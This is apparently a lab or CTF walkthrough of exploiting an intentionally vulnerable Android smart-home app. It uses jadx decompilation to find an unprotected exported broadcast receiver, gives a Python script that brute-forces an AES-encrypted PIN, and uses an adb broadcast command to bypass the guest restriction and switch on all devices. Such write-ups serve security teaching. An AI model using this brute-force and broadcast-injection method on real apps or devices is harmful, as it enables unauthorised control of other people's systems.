Step1: Analyze the source code using jadx

<img width="1470" height="956" alt="Screenshot 2026-02-28 at 7 24 15 in the evening" src="https://github.com/user-attachments/assets/d70db2f2-7c5d-4128-8d96-0bd1daea56e5" />

And browse to AndroidManifest.xml to view the source code:

After review, I see the vulnerable at: android:exported="true"> with no android:permission attribute means any application or ADB command can send a broadcast to MasterReceiver without any authentication

<img width="557" height="148" alt="Screenshot 2026-02-28 at 7 27 27 in the evening" src="https://github.com/user-attachments/assets/b0c1fab4-6850-494b-994f-2d0116658a80" />

Step2: Go to analyze more in MasterSwitchActivity.java to see the Guest Check:

<img width="854" height="441" alt="Screenshot 2026-02-28 at 7 39 06 in the evening" src="https://github.com/user-attachments/assets/2d05de78-05d2-4153-afe0-0906e84bbc6b" />

As you can see, it check only the UI but we can master_on via adb command and it compare the master_on with the pin but we don't have the pin so we need to crack this, so we need to anaylze more about the checker

Step3: Search MASTER_ON

<img width="1470" height="956" alt="Screenshot 2026-02-28 at 7 28 23 in the evening" src="https://github.com/user-attachments/assets/324f30aa-9969-4bcb-b109-db4358eedea4" />

And I see checker_key:

<img width="1470" height="956" alt="Screenshot 2026-02-28 at 7 29 58 in the evening" src="https://github.com/user-attachments/assets/e5b23d06-b073-4e13-8690-b27e6bf3e622" />

So, it use AES algorithm, encrypted strings = "OSnaALIWUkpOziVAMycaZQ==", and I need to write a python script to brute force to get the PIN:

Here is my python script:

import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


ENCRYPTED_DS  = "OSnaALIWUkpOziVAMycaZQ=="   
TARGET        = "master_on"                   
ALGORITHM     = "AES"                         
MAX_RANGE     = 1000                     



def generate_key(static_key: int) -> bytes:
  
    key_bytes      = bytearray(16)
    static_key_b   = str(static_key).encode("utf-8")
    length         = min(len(static_key_b), 16)
    key_bytes[:length] = static_key_b[:length]
    return bytes(key_bytes)


def try_decrypt(encrypted: bytes, key_int: int) -> str | None:
   
    try:
        key     = generate_key(key_int)
        cipher  = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
        dec     = cipher.decryptor()
        raw     = dec.update(encrypted) + dec.finalize()

        # Remove PKCS5 padding
        pad_len = raw[-1]
        if pad_len < 1 or pad_len > 16:
            return None
        return raw[:-pad_len].decode("utf-8")
    except Exception:
        return None


def crack(encrypted_b64: str, target: str, max_range: int) -> int | None:
    encrypted = base64.b64decode(encrypted_b64)

    print(f"[*] Encrypted string : {encrypted_b64}")
    print(f"[*] Target plaintext : {target}")
    print(f"[*] Brute forcing    : 0 → {max_range:,}")
    print(f"[*] Algorithm        : AES/ECB/PKCS5Padding\n")

    for i in range(max_range + 1):
        if i % 100_000 == 0 and i > 0:
            print(f"    ... tried {i:,} keys so far")

        result = try_decrypt(encrypted, i)
        if result == target:
            return i

    return None


def main():
    found = crack(ENCRYPTED_DS, TARGET, MAX_RANGE)

    print()
    if found is not None:
        print(f"[+] PIN FOUND: {found}")
    else:
        print(f"[-] PIN not found in range 0–{MAX_RANGE:,}")


if __name__ == "__main__":
    main()


And found the PIN:

<img width="578" height="382" alt="Screenshot 2026-02-28 at 7 43 38 in the evening" src="https://github.com/user-attachments/assets/9296b268-0358-41d9-a24e-a62741dd94d5" />

So, send the PIN via adb command but first we need to sign up and log in to the application:

<img width="444" height="776" alt="Screenshot 2026-02-28 at 7 45 10 in the evening" src="https://github.com/user-attachments/assets/03a01e4f-62fb-4e6d-9633-3f319c3a9641" />

And you can see it all are turning off like the above that we anaylze Guest cannot control all the system:

<img width="439" height="780" alt="Screenshot 2026-02-28 at 7 46 22 in the evening" src="https://github.com/user-attachments/assets/b3ba268d-a6c3-4044-a103-057fce33c375" />

but we have a PIN so we control this via adb command:

adb shell am broadcast -a MASTER_ON --ei key 345

<img width="581" height="384" alt="Screenshot 2026-02-28 at 7 48 18 in the evening" src="https://github.com/user-attachments/assets/7fe48551-5c11-433c-88bd-dfcfc75f7005" />

And we can see, Now all devices are turning on

<img width="442" height="795" alt="Screenshot 2026-02-28 at 7 49 27 in the evening" src="https://github.com/user-attachments/assets/539862cb-1f7a-4829-8762-2b72e947595a" />

<img width="452" height="781" alt="Screenshot 2026-02-28 at 7 50 12 in the evening" src="https://github.com/user-attachments/assets/b782e34e-8873-4bac-a7ef-6e4ed994d505" />








